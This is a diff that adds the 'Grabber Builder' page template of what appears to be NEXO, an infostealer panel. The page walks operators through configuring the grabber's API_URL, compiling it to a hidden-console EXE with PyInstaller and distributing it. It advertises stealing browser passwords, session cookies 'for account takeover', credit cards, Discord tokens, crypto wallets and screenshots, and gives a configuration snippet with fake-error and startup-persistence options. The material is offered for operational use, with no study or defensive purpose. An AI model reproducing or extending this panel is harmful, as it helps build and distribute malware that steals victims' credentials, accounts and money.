@@ -1,0 +1,202 @@
+{% extends 'base.html' %}
+
+{% block title %}Builder - NEXO{% endblock %}
+
+{% block content %}
+<div class="sidebar">
+    <div class="logo">
+        <h1><i class="fas fa-bolt"></i> <span>NEXO</span></h1>
+    </div>
+    <ul class="nav-menu">
+        <li class="nav-item">
+            <a href="{{ url_for('dashboard') }}" class="nav-link">
+                <i class="fas fa-home"></i>
+                <span>Dashboard</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('builder') }}" class="nav-link active">
+                <i class="fas fa-hammer"></i>
+                <span>Builder</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('settings') }}" class="nav-link">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('logout') }}" class="nav-link">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Logout</span>
+            </a>
+        </li>
+    </ul>
+</div>
+
+<main class="main-content">
+    <div class="header">
+        <h2>Grabber Builder</h2>
+        <div class="user-info">
+            <span>{{ session.username }}</span>
+            <div class="user-avatar">{{ session.username[0].upper() }}</div>
+        </div>
+    </div>
+
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+        <!-- Builder Instructions -->
+        <div class="table-container" style="padding: 30px;">
+            <h3 style="margin-bottom: 20px;"><i class="fas fa-info-circle"></i> How to Build Your Grabber</h3>
+
+            <div style="margin-bottom: 25px;">
+                <h4 style="color: var(--purple-light); margin-bottom: 10px;">Step 1: Get the Grabber Code</h4>
+                <p style="color: var(--text-secondary); line-height: 1.6;">
+                    Download the NEXO Grabber from the GitHub repository or use the code provided in your panel folder.
+                </p>
+            </div>
+
+            <div style="margin-bottom: 25px;">
+                <h4 style="color: var(--purple-light); margin-bottom: 10px;">Step 2: Configure API URL</h4>
+                <p style="color: var(--text-secondary); line-height: 1.6; margin-bottom: 10px;">
+                    Replace the API_URL in the grabber code with your personal endpoint:
+                </p>
+                <div style="background: var(--bg-secondary); padding: 15px; border-radius: 10px; display: flex; align-items: center; gap: 10px;">
+                    <code style="flex: 1; font-size: 12px; word-break: break-all;">{{ api_url }}</code>
+                    <button class="btn btn-primary btn-sm" onclick="copyToClipboard('{{ api_url }}', this)">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 25px;">
+                <h4 style="color: var(--purple-light); margin-bottom: 10px;">Step 3: Compile to EXE</h4>
+                <p style="color: var(--text-secondary); line-height: 1.6;">
+                    Use PyInstaller to compile your grabber:
+                </p>
+                <div style="background: var(--bg-secondary); padding: 15px; border-radius: 10px; margin-top: 10px;">
+                    <code style="font-size: 13px;">pyinstaller --onefile --noconsole grabber.py</code>
+                </div>
+            </div>
+
+            <div>
+                <h4 style="color: var(--purple-light); margin-bottom: 10px;">Step 4: Distribute</h4>
+                <p style="color: var(--text-secondary); line-height: 1.6;">
+                    Your compiled EXE is ready! All captured data will appear in your dashboard automatically.
+                </p>
+            </div>
+        </div>
+
+        <!-- Features List -->
+        <div class="table-container" style="padding: 30px;">
+            <h3 style="margin-bottom: 20px;"><i class="fas fa-list"></i> Grabber Features</h3>
+
+            <div style="display: grid; gap: 15px;">
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(147, 51, 234, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-key" style="color: var(--purple-light);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Browser Passwords</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Chrome, Edge, Brave, Opera, Firefox, etc.</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(59, 130, 246, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-cookie" style="color: var(--info);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Browser Cookies</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Session cookies for account takeover</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(245, 158, 11, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-credit-card" style="color: var(--warning);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Credit Cards</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Saved payment methods</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(239, 68, 68, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fab fa-discord" style="color: var(--danger);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Discord Tokens</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">With account info validation</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(147, 51, 234, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fab fa-bitcoin" style="color: var(--purple-light);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Crypto Wallets</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">MetaMask, Exodus, Atomic, etc.</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(34, 197, 94, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-camera" style="color: var(--success);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">Screenshot</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Automatic desktop capture</div>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--bg-secondary); border-radius: 10px;">
+                    <div style="width: 40px; height: 40px; border-radius: 10px; background: rgba(59, 130, 246, 0.2); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-desktop" style="color: var(--info);"></i>
+                    </div>
+                    <div>
+                        <div style="font-weight: 500;">System Info</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">IP, location, hardware, OS</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Code Sample -->
+    <div class="table-container" style="padding: 30px; margin-top: 30px;">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-code"></i> Quick Setup Code</h3>
+        <p style="color: var(--text-secondary); margin-bottom: 15px;">
+            Add this to the top of your grabber to configure it for your panel:
+        </p>
+        <div style="background: var(--bg-secondary); padding: 20px; border-radius: 12px; position: relative;">
+            <button class="btn btn-primary btn-sm" style="position: absolute; top: 10px; right: 10px;" onclick="copyCode()">
+                <i class="fas fa-copy"></i> Copy
+            </button>
+            <pre id="code-sample" style="color: var(--text-primary); font-family: monospace; font-size: 13px; line-height: 1.6; overflow-x: auto; margin: 0;">
+# NEXO Grabber Configuration
+API_URL = "{{ api_url }}"
+SEND_SCREENSHOT = True
+FAKE_ERROR = False
+ADD_TO_STARTUP = False
+
+# The grabber will automatically send all data to your panel
+# View results at: {{ request.host_url }}{{ user.panel_id }}/dashboard
+            </pre>
+        </div>
+    </div>
+</main>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function copyCode() {
+    const code = document.getElementById('code-sample').textContent;
+    navigator.clipboard.writeText(code).then(() => {
+        alert('Code copied to clipboard!');
+    });
+}
+</script>
+{% endblock %}
